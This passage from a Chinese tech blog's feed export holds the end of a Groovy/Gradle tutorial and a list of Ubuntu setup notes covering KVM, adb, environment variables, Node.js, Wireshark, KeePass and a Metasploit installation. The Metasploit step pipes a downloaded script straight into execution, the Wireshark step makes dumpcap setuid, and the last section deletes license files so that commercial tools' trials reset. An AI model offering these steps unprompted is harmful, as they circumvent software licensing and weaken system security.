<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">task method &lt;&lt;&#123;</span><br><span class="line">    add(1, 2)</span><br><span class="line">    minus 1, 2  //语句后面的可以省略，方法的括号可以省略。</span><br><span class="line">    def n = mul 1, 2</span><br><span class="line">    println n</span><br><span class="line">    def f = div 2.0, 3</span><br><span class="line">    println f</span><br><span class="line">&#125;</span><br><span class="line">//用def关键字定义方法。</span><br><span class="line">def add(int a, int b)&#123;</span><br><span class="line">    println a + b</span><br><span class="line">&#125;</span><br><span class="line">def minus(a, b)&#123;//参数类型可以省略</span><br><span class="line">    println a - b</span><br><span class="line">&#125;</span><br><span class="line">//指定了方法返回类型，可以不需要def关键字来定义方法。</span><br><span class="line">int mul(a, b)&#123;</span><br><span class="line">    return a * b</span><br><span class="line">&#125;</span><br><span class="line">//如果不使用return ，方法的返回值为最后一行代码的执行结果。</span><br><span class="line">double div(a, b)&#123;//return可以省略掉</span><br><span class="line">    a/b </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  gradle01 gradle -q method</span><br><span class="line">3</span><br><span class="line">-1</span><br><span class="line">2</span><br><span class="line">0.6666666667</span><br></pre></td></tr></table></figure>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p><code>Groovy</code> 类非常类似于 <code>Java</code> 类。</p>
]]></content>
      <categories>
        <category>gradle</category>
      </categories>
      <tags>
        <tag>gradle</tag>
      </tags>
  </entry>
  <entry>
    <title>linux使用记录</title>
    <url>/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="1-Android-studio-出现-grant-current-user-access-to-x2F-dev-x2F-kvm-以及-x2F-dev-x2F-kvm-devices-permission-denies"><a href="#1-Android-studio-出现-grant-current-user-access-to-x2F-dev-x2F-kvm-以及-x2F-dev-x2F-kvm-devices-permission-denies" class="headerlink" title="1. Android studio 出现 grant current user access to &#x2F;dev&#x2F;kvm 以及&#x2F;dev&#x2F;kvm devices: permission denies"></a>1. Android studio 出现 grant current user access to &#x2F;dev&#x2F;kvm 以及&#x2F;dev&#x2F;kvm devices: permission denies</h1><p>linux 中启动模拟器出现 grant current user access to &#x2F;dev&#x2F;kvm 错误</p>
<ul>
<li>临时解决方法：</li>
</ul>
<p>打开 terminal 输入代码 <code>sudo chown username -R /dev/kvm</code> 注意 username 是你用的用户名， 重新启动模拟器就可以了。</p>
<ul>
<li>永久解决办法：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装qemu-kvm</span><br><span class="line">sudo apt install qemu-kvm</span><br><span class="line"></span><br><span class="line">使用以下命令将您的用户添加到kvm组：</span><br><span class="line">sudo adduser $USER kvm</span><br><span class="line"></span><br><span class="line">如果仍然显示拒绝权限：</span><br><span class="line">sudo chown $USER /dev/kvm</span><br></pre></td></tr></table></figure>

<h1 id="2-Android-studio-创建快捷方式"><a href="#2-Android-studio-创建快捷方式" class="headerlink" title="2. Android studio 创建快捷方式"></a>2. Android studio 创建快捷方式</h1><p>打开<code>/usr/share/applications</code>目录，使用<code>sudo vim AndroidStudio.desktop</code>创建 AndroidStudio 的快捷方式，加入以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=Android Studio     #名称</span><br><span class="line">Comment=Android Dev     #注释</span><br><span class="line">StartupNotify=true</span><br><span class="line">Terminal=false</span><br><span class="line">Type=Application</span><br><span class="line">Icon=/home/ckcat/DevelopTools/android-studio/bin/studio.png     #设置图标</span><br><span class="line">Exec=/home/ckcat/DevelopTools/android-studio/bin/studio.sh %F   #设置启动方式</span><br></pre></td></tr></table></figure>

<p>保存退出后，其图标将会出现在 Applications 中，将其复制到桌面即可创建桌面快捷方式。</p>
<h1 id="3-Ubuntu-标题栏实时显示上下行网速、CPU-及内存使用率"><a href="#3-Ubuntu-标题栏实时显示上下行网速、CPU-及内存使用率" class="headerlink" title="3. Ubuntu 标题栏实时显示上下行网速、CPU 及内存使用率"></a>3. Ubuntu 标题栏实时显示上下行网速、CPU 及内存使用率</h1><p>安装 indicator-sysmonitor：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:fossfreedom/indicator-sysmonitor</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install indicator-sysmonitor</span><br></pre></td></tr></table></figure>

<p>终端执行：<code>indicator-sysmonitor &amp;</code>， 为了方便还要为程序添加开机启动！鼠标右键点击标题栏上图标，弹出菜单，选择首选项，出现如下界面：</p>
<img src="/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2019-11-03-14-57-30.png" class="">

<p>最后进行格式设定,设置界面如下：</p>
<img src="/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2019-11-03-15-00-29.png" class="">

<p>设置好之后可以点击 Test 以下，最后别忘了保存,最终效果如下：</p>
<img src="/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2019-11-03-15-02-39.png" class="">

<h1 id="4-设置深度截图快捷方式"><a href="#4-设置深度截图快捷方式" class="headerlink" title="4. 设置深度截图快捷方式"></a>4. 设置深度截图快捷方式</h1><p>通过应用商店安装<a href="(https://github.com/linuxdeepin/deepin-screenshot)"><code>deepin-screenshot</code></a>,在系统 Keyboard 中添加深度截图，设置快捷方式。</p>
<img src="/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2019-11-03-15-48-05.png" class="">

<img src="/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2019-11-03-15-49-11.png" class="">

<h1 id="5-配置环境变量"><a href="#5-配置环境变量" class="headerlink" title="5. 配置环境变量"></a>5. 配置环境变量</h1><h2 id="5-1-路径写法"><a href="#5-1-路径写法" class="headerlink" title="5.1. 路径写法"></a>5.1. 路径写法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 可执行文件(一般在文件夹bin内):</span><br><span class="line">export PATH=/usr/local/cuda-8.0/bin:$PATH</span><br><span class="line"></span><br><span class="line"># 库文件(一般在文件夹lib内 .so):</span><br><span class="line">export LD_LIBRARY_PATH=/home/opencv2.4.9/lib:$LD_LIBRARY_PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="5-2-临时设置"><a href="#5-2-临时设置" class="headerlink" title="5.2. 临时设置"></a>5.2. 临时设置</h2><p>在终端中输入<code>export</code>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/usr/local/cuda-8.0/bin:$PATH</span><br></pre></td></tr></table></figure>

<h2 id="5-3-当前用户的全局设置"><a href="#5-3-当前用户的全局设置" class="headerlink" title="5.3. 当前用户的全局设置"></a>5.3. 当前用户的全局设置</h2><p>打开~&#x2F;.bashrc，在末尾添加环境变量,如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/home/public/software_install/protobuf-3.1.0/bin:$PATH</span><br><span class="line">export LD_LIBRARY_PATH=/home/public/software_install/protobuf-3.1.0/lib:$LD_LIBRARY_PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行：<code>source ~/.bashrc</code>使之生效。</p>
<h2 id="5-4-所有用户的全局设置"><a href="#5-4-所有用户的全局设置" class="headerlink" title="5.4. 所有用户的全局设置"></a>5.4. 所有用户的全局设置</h2><p>使用<code>sudo vim /etc/profile</code>打开系统配置文件，在末尾添加环境变量，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export PATH=/home/public/software_install/protobuf-3.1.0/bin:$PATH</span><br><span class="line">export LD_LIBRARY_PATH=/home/public/software_install/protobuf-3.1.0/lib:$LD_LIBRARY_PATH</span><br></pre></td></tr></table></figure>

<p>执行：<code>source profile</code>使之生效。</p>
<p>配置好后可以使用<code>echo $PATH</code>或<code>env</code>测试当前的环境变量。</p>
<h1 id="6-adb-devices-报错-no-permissions-user-in-plugdev-group-are-your-udev-rules-wrong"><a href="#6-adb-devices-报错-no-permissions-user-in-plugdev-group-are-your-udev-rules-wrong" class="headerlink" title="6. adb devices 报错 no permissions (user in plugdev group; are your udev rules wrong?)"></a>6. adb devices 报错 no permissions (user in plugdev group; are your udev rules wrong?)</h1><p>参考仓库：<a href="https://github.com/snowdream/51-android">https://github.com/snowdream/51-android</a> 或 <a href="https://github.com/M0Rf30/android-udev-rules">https://github.com/M0Rf30/android-udev-rules</a></p>
<p>如果还是不行的话再参考下列方法。</p>
<h2 id="6-1-lsusb-找到你手机的-usb-地址"><a href="#6-1-lsusb-找到你手机的-usb-地址" class="headerlink" title="6.1. lsusb 找到你手机的 usb 地址"></a>6.1. lsusb 找到你手机的 usb 地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ lsusb</span><br><span class="line">Bus 002 Device 003: ID 18d1:4ee7 Google Inc.</span><br><span class="line">Bus 002 Device 001: ID 1d6b:0003 Linux Foundation 3.0 root hub</span><br><span class="line">Bus 001 Device 003: ID 04f2:b59e Chicony Electronics Co., Ltd</span><br><span class="line">Bus 001 Device 004: ID 8087:0aaa Intel Corp.</span><br><span class="line">Bus 001 Device 002: ID 0ea0:2213 Ours Technology, Inc.</span><br><span class="line">Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub</span><br></pre></td></tr></table></figure>

<p>他会列出来所有的 usb 设备，你找下。如果试下找不到，那么拔掉手机看下，哪了没有了就是哪个。</p>
<h2 id="6-2-修改-etc-udev-rules-d-51-android-rules文件"><a href="#6-2-修改-etc-udev-rules-d-51-android-rules文件" class="headerlink" title="6.2. 修改/etc/udev/rules.d/51-android.rules文件"></a>6.2. 修改<code>/etc/udev/rules.d/51-android.rules</code>文件</h2><p>创建<code>51-android.rules</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo gedit /etc/udev/rules.d/51-android.rules</span><br><span class="line">[sudo] password for ckcat:</span><br></pre></td></tr></table></figure>

<p>添加下列内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ATTR&#123;idProduct&#125;==&quot;4ee7&quot;, SYMLINK+=&quot;android_adb&quot;, MODE=&quot;0660&quot;, GROUP=&quot;plugdev&quot;, TAG+=&quot;uaccess&quot;, SYMLINK+=&quot;android&quot;</span><br></pre></td></tr></table></figure>

<p>注意：ATTR{idProduct}的值是你查找手机设备的 usb 的地址。</p>
<h2 id="6-3-执行下列命令"><a href="#6-3-执行下列命令" class="headerlink" title="6.3. 执行下列命令"></a>6.3. 执行下列命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo usermod -a -G plugdev $(id -u -n)</span><br><span class="line">$ sudo udevadm control --reload-rules</span><br><span class="line">$ sudo service udev restart</span><br><span class="line">$ sudo udevadm trigger</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行完上述命令后，重启 adb：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ adb kill-server</span><br><span class="line">$ adb devices</span><br><span class="line">* daemon not running; starting now at tcp:5037</span><br><span class="line">* daemon started successfully</span><br><span class="line">List of devices attached</span><br><span class="line">HT6770300079	unauthorized</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在手机上允许就可以了。</p>
<p>参考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/caoxinyu/p/10568463.html</span><br><span class="line">https://juejin.im/post/5bed2b45f265da61530457ee</span><br></pre></td></tr></table></figure>

<h1 id="7-VIM-普通用户保存文件时用-sudo-获取-root-权限"><a href="#7-VIM-普通用户保存文件时用-sudo-获取-root-权限" class="headerlink" title="7. VIM 普通用户保存文件时用 sudo 获取 root 权限"></a>7. VIM 普通用户保存文件时用 sudo 获取 root 权限</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:w !sudo tee %</span><br></pre></td></tr></table></figure>

<p>百分号 (“%”) 代表当前文件名，这条命令的含义是把当前编辑的文件的内容当做标准输入输出到命令 sudo tee 文件名的文件里去，也就是 sudo 保存为当前文件名。</p>
<h1 id="8-安装-nodejs"><a href="#8-安装-nodejs" class="headerlink" title="8. 安装 nodejs"></a>8. 安装 nodejs</h1><p>1.安装仓库中包含的最新版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nodejs</span><br><span class="line"></span><br><span class="line"># 安装npm管理工具</span><br><span class="line"></span><br><span class="line">sudo apt install npm</span><br></pre></td></tr></table></figure>

<p>2.升级 node 版本为长服务版（lts）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo npm install -g n</span><br><span class="line">sudo n lts</span><br></pre></td></tr></table></figure>

<p>3.切换版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 可以通过以下命令来切换node的版本</span><br><span class="line"></span><br><span class="line">sudo n #将显示本机的可用版本列表，通过上下键来选择对应的版本</span><br><span class="line"></span><br><span class="line"># 如果对版本比较熟悉，可直接指定版本</span><br><span class="line">sudo n 10.13.0</span><br><span class="line"></span><br><span class="line"># 查看node版本</span><br><span class="line">sudo n -v</span><br></pre></td></tr></table></figure>

<p>4.升级 npm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo npm i -g npm</span><br></pre></td></tr></table></figure>

<h1 id="9-ubuntu-安装-Metasploit-Framework"><a href="#9-ubuntu-安装-Metasploit-Framework" class="headerlink" title="9. ubuntu 安装 Metasploit Framework"></a>9. ubuntu 安装 Metasploit Framework</h1><h2 id="9-1-安装"><a href="#9-1-安装" class="headerlink" title="9.1. 安装"></a>9.1. 安装</h2><p>首先打开终端输入</p>
<p><code>curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</code></p>
<p>之后如果你不是 root 用户登录的话你要输入 root 密码<br>接着你要做的是就是等待安装完成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> Bboysoul  ➜  shell git:(master) curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  5394  100  5394    0     0   3105      0  0:00:01  0:00:01 --:--:--  3107</span><br><span class="line">Switching to root user to update the package</span><br><span class="line">[sudo] bboysoul 的密码：</span><br><span class="line">Adding metasploit-framework to your repository list..OK</span><br><span class="line">Updating package cache..OK</span><br><span class="line">Checking for and installing update..</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树</span><br><span class="line">正在读取状态信息... 完成</span><br><span class="line">下列【新】软件包将被安装：</span><br><span class="line">  metasploit-framework</span><br><span class="line">升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 1 个软件包未被升级。</span><br><span class="line">需要下载 177 MB 的归档。</span><br><span class="line">解压缩后会消耗 423 MB 的额外空间。</span><br><span class="line">获取:1 http://downloads.metasploit.com/data/releases/metasploit-framework/apt lucid/main amd64 metasploit-framework amd64 4.16.16+20171109102640.git.1.c5fd027~1rapid7-1 [177 MB]</span><br><span class="line">已下载 177 MB，耗时 2分 8秒 (1,373 kB/s)</span><br><span class="line">正在选中未选择的软件包 metasploit-framework。</span><br><span class="line">(正在读取数据库 ... 系统当前共安装有 208821 个文件和目录。)</span><br><span class="line">正准备解包 .../metasploit-framework_4.16.16+20171109102640.git.1.c5fd027~1rapid7-1_amd64.deb  ...</span><br><span class="line">正在解包 metasploit-framework (4.16.16+20171109102640.git.1.c5fd027~1rapid7-1) ...</span><br><span class="line">正在设置 metasploit-framework (4.16.16+20171109102640.git.1.c5fd027~1rapid7-1) ...</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfbinscan 来在自动模式中提供 /usr/bin/msfbinscan (msfbinscan)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfconsole 来在自动模式中提供 /usr/bin/msfconsole (msfconsole)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfd 来在自动模式中提供 /usr/bin/msfd (msfd)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfdb 来在自动模式中提供 /usr/bin/msfdb (msfdb)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfelfscan 来在自动模式中提供 /usr/bin/msfelfscan (msfelfscan)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfmachscan 来在自动模式中提供 /usr/bin/msfmachscan (msfmachscan)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfpescan 来在自动模式中提供 /usr/bin/msfpescan (msfpescan)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfrop 来在自动模式中提供 /usr/bin/msfrop (msfrop)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfrpc 来在自动模式中提供 /usr/bin/msfrpc (msfrpc)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfrpcd 来在自动模式中提供 /usr/bin/msfrpcd (msfrpcd)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfupdate 来在自动模式中提供 /usr/bin/msfupdate (msfupdate)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/msfvenom 来在自动模式中提供 /usr/bin/msfvenom (msfvenom)</span><br><span class="line">update-alternatives: 使用 /opt/metasploit-framework/bin/metasploit-aggregator 来在自动模式中提供 /usr/bin/metasploit-aggregator (metasploit-aggregator)</span><br><span class="line">Run msfconsole to get started</span><br><span class="line">W: --force-yes 已经被废弃，请使用以 --allow 开头的选项来代替。</span><br><span class="line">安装完成</span><br></pre></td></tr></table></figure>

<p>接着输入<code>msfconsole</code></p>
<p>会提示你是否建立一个 database，你输入 yes 就好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> Bboysoul  ➜  shell git:(master) ✗ msfconsole</span><br><span class="line"></span><br><span class="line"> ** Welcome to Metasploit Framework Initial Setup **</span><br><span class="line">    Please answer a few questions to get started.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Would you like to use and setup a new database (recommended)? yes</span><br><span class="line">Creating database at /home/bboysoul/.msf4/db</span><br><span class="line">Starting database at /home/bboysoul/.msf4/db...success</span><br><span class="line">Creating database users</span><br><span class="line">Creating initial database schema</span><br><span class="line"></span><br><span class="line"> ** Metasploit Framework Initial Setup Complete **</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  +-------------------------------------------------------+</span><br><span class="line">  |  METASPLOIT by Rapid7                                 |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line">  |      __________________   |                           |</span><br><span class="line">  |  ==c(______(o(______(_()  | |&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;|======[***  |</span><br><span class="line">  |             )=\           | |  EXPLOIT   \            |</span><br><span class="line">  |            // \\          | |_____________\_______    |</span><br><span class="line">  |           //   \\         | |==[msf &gt;]============\   |</span><br><span class="line">  |          //     \\        | |______________________\  |</span><br><span class="line">  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |</span><br><span class="line">  |        //         \\      |  *********************    |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line">  |      o O o                |        \&#x27;\/\/\/&#x27;/         |</span><br><span class="line">  |              o O          |         )======(          |</span><br><span class="line">  |                 o         |       .&#x27;  LOOT  &#x27;.        |</span><br><span class="line">  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |</span><br><span class="line">  | |    PAYLOAD     |&quot;&quot;\___, |     /    (_||_     \      |</span><br><span class="line">  | |________________|__|)__| |    |     __||_)     |     |</span><br><span class="line">  | |(@)(@)&quot;&quot;&quot;**|(@)(@)**|(@) |    &quot;       ||       &quot;     |</span><br><span class="line">  |  = = = = = = = = = = = =  |     &#x27;--------------&#x27;      |</span><br><span class="line">  +---------------------------+---------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v4.16.16-dev-                        ]</span><br><span class="line">+ -- --=[ 1702 exploits - 969 auxiliary - 299 post        ]</span><br><span class="line">+ -- --=[ 503 payloads - 40 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]</span><br><span class="line"></span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>

<p>接着我们建立<code>Module database</code>，如果不建立那么你在<code>search</code>一些模块的时候会提示<br><code>[!] Module database cache not built yet, using slow search</code></p>
<p>在此之前我们首先要安装<code>postgresql</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install postgresql</span><br></pre></td></tr></table></figure>

<p>安装完成之后确认下服务是否开启，如果没有开启它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> Bboysoul  ➜  shell git:(master) ✗ sudo service postgresql status</span><br><span class="line">● postgresql.service - PostgreSQL RDBMS</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (exited) since 五 2017-11-10 14:59:02 CST; 29s ago</span><br><span class="line"> Main PID: 27540 (code=exited, status=0/SUCCESS)</span><br><span class="line">   CGroup: /system.slice/postgresql.service</span><br><span class="line"></span><br><span class="line">11月 10 14:59:02 bboysoul systemd[1]: Starting PostgreSQL RDBMS...</span><br><span class="line">11月 10 14:59:02 bboysoul systemd[1]: Started PostgreSQL RDBMS.</span><br><span class="line">11月 10 14:59:08 bboysoul systemd[1]: Started PostgreSQL RDBMS.</span><br></pre></td></tr></table></figure>

<p>接着进入 metasploit 中，输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; msfdb init</span><br><span class="line">[*] exec: msfdb init</span><br><span class="line"></span><br><span class="line">Found a database at /home/bboysoul/.msf4/db, checking to see if it is started</span><br><span class="line">Database already started at /home/bboysoul/.msf4/db</span><br></pre></td></tr></table></figure>

<p>之后输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf &gt; db_rebuild_cache</span><br><span class="line">[*] Purging and rebuilding the module cache in the background...</span><br></pre></td></tr></table></figure>

<p>等几分钟之后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms10</span><br></pre></td></tr></table></figure>

<p>看看是不是还有<br><code>[!] Module database cache not built yet, using slow search</code><br>这个警告</p>
<p>如果还有那么再等一段时间再次执行，如果十分钟以后还是出现这个警告，那么可能你的步骤错了</p>
<blockquote>
<p>来源：<a href="https://www.jianshu.com/p/fdecffd6083c">https://www.jianshu.com/p/fdecffd6083c</a></p>
</blockquote>
<h1 id="10-解决-Ubuntu-下-KeePass2-中文显示为方块的问题"><a href="#10-解决-Ubuntu-下-KeePass2-中文显示为方块的问题" class="headerlink" title="10. 解决 Ubuntu 下 KeePass2 中文显示为方块的问题"></a>10. 解决 Ubuntu 下 KeePass2 中文显示为方块的问题</h1><h2 id="10-1-安装-keepass2"><a href="#10-1-安装-keepass2" class="headerlink" title="10.1. 安装 keepass2"></a>10.1. 安装 keepass2</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install keepass2</span><br></pre></td></tr></table></figure>

<h2 id="10-2-下载-KeePass2-语言包"><a href="#10-2-下载-KeePass2-语言包" class="headerlink" title="10.2. 下载 KeePass2 语言包"></a>10.2. 下载 KeePass2 语言包</h2><p><code>KeePass</code> 的<a href="http://keepass.info/translations.html">官网</a>提供了各种语言的语言包，下载中文 2.x 版本语言包后解压到 <code>/usr/lib/KeePass/Languages</code> 目录下，重启 <code>KeePass</code> 后设置 <code>View-&gt;Change Language</code>，选择 <code>Simplified Chinese</code> 即可。</p>
<h2 id="10-3-修改启动脚本"><a href="#10-3-修改启动脚本" class="headerlink" title="10.3. 修改启动脚本"></a>10.3. 修改启动脚本</h2><p>修改&#x2F;usr&#x2F;bin&#x2F;keepass2，加入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LANG=zh_CN.utf8</span><br></pre></td></tr></table></figure>

<h2 id="10-4-修改系统字体设置"><a href="#10-4-修改系统字体设置" class="headerlink" title="10.4. 修改系统字体设置"></a>10.4. 修改系统字体设置</h2><p>参考 FAQ，修改&#x2F;etc&#x2F;fonts&#x2F;conf.avail&#x2F;65-nonlatin.conf，添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;alias&gt;</span><br><span class="line">   &lt;family&gt;Ubuntu&lt;/family&gt;</span><br><span class="line">   &lt;prefer&gt;</span><br><span class="line">      &lt;family&gt;sans-serif&lt;/family&gt;</span><br><span class="line">   &lt;/prefer&gt;</span><br><span class="line">&lt;/alias&gt;</span><br></pre></td></tr></table></figure>

<p>在进行上述操作后，重启 KeePass2，应该就可以正常显示中文了。</p>
<h1 id="11-Ubuntu-安装-wireshark"><a href="#11-Ubuntu-安装-wireshark" class="headerlink" title="11. Ubuntu 安装 wireshark"></a>11. Ubuntu 安装 wireshark</h1><p>添加 PPA 存储库并安装 Wireshark：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:wireshark-dev/stable</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt -y install wireshark</span><br></pre></td></tr></table></figure>

<p>添加 wireshark 用户组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo groupadd wireshark</span><br></pre></td></tr></table></figure>

<p>将 dumpcap 更改为 wireshark 用户组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chgrp wireshark /usr/bin/dumpcap</span><br></pre></td></tr></table></figure>

<p>让 wireshark 用户组有 root 权限使用 dumpcap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chmod 4755 /usr/bin/dumpcap</span><br></pre></td></tr></table></figure>

<p>将需要使用的普通用户名加入 wireshark 用户组，我的用户是 <code>cackt</code> ，则需要使用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gpasswd -a dengyi wireshark</span><br></pre></td></tr></table></figure>

<h1 id="12-安装-Albert"><a href="#12-安装-Albert" class="headerlink" title="12. 安装 Albert"></a>12. 安装 Albert</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:noobslab/macbuntu</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get install albert</span><br></pre></td></tr></table></figure>

<p>设置自动启动，<a href="https://github.com/albertlauncher/albert/issues/11">参考</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /usr/share/applications/albert.desktop ~/.config/autostart/</span><br></pre></td></tr></table></figure>

<img src="/2019/11/03/linux%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2019-12-15-20-41-37.png" class="">

<h1 id="13-ubuntu-中添加和删除源"><a href="#13-ubuntu-中添加和删除源" class="headerlink" title="13. ubuntu 中添加和删除源"></a>13. ubuntu 中添加和删除源</h1><p>添加 PPA 源的命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:user/ppa-name</span><br></pre></td></tr></table></figure>

<p>添加好更新一下： <code>sudo apt-get update</code> 。</p>
<p>删除命令格式则为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository -r ppa:user/ppa-name</span><br><span class="line">如</span><br><span class="line">sudo add-apt-repository -r ppa:eugenesan/java</span><br></pre></td></tr></table></figure>

<p>或者进入 <code>/etc/apt/sources.list.d</code> 目录，将相应 ppa 源的保存文件删除。</p>
<h1 id="14-vmware-装的-ubuntu-18-04-后安装-vm-tools-复制粘贴失效解决办法。"><a href="#14-vmware-装的-ubuntu-18-04-后安装-vm-tools-复制粘贴失效解决办法。" class="headerlink" title="14. vmware 装的 ubuntu 18.04,后安装 vm tools 复制粘贴失效解决办法。"></a>14. vmware 装的 ubuntu 18.04,后安装 vm tools 复制粘贴失效解决办法。</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install -y open-vm-tools open-vm-tools-desktop</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>

<h1 id="15-试用-010Editor-、-Beyond-Compare-4-、Source-Insight4-0"><a href="#15-试用-010Editor-、-Beyond-Compare-4-、Source-Insight4-0" class="headerlink" title="15. 试用 010Editor 、 Beyond Compare 4 、Source Insight4.0"></a>15. 试用 010Editor 、 Beyond Compare 4 、Source Insight4.0</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> ~/.config/SweetScape/010\ Editor.ini</span><br><span class="line"><span class="built_in">rm</span> ~/.config/bcompare/registry.dat</span><br><span class="line"><span class="built_in">rm</span> ~/.wine/drive_c/ProgramData/Source\ Insight/4.0/si4.lic</span><br></pre></td></tr></table></figure>

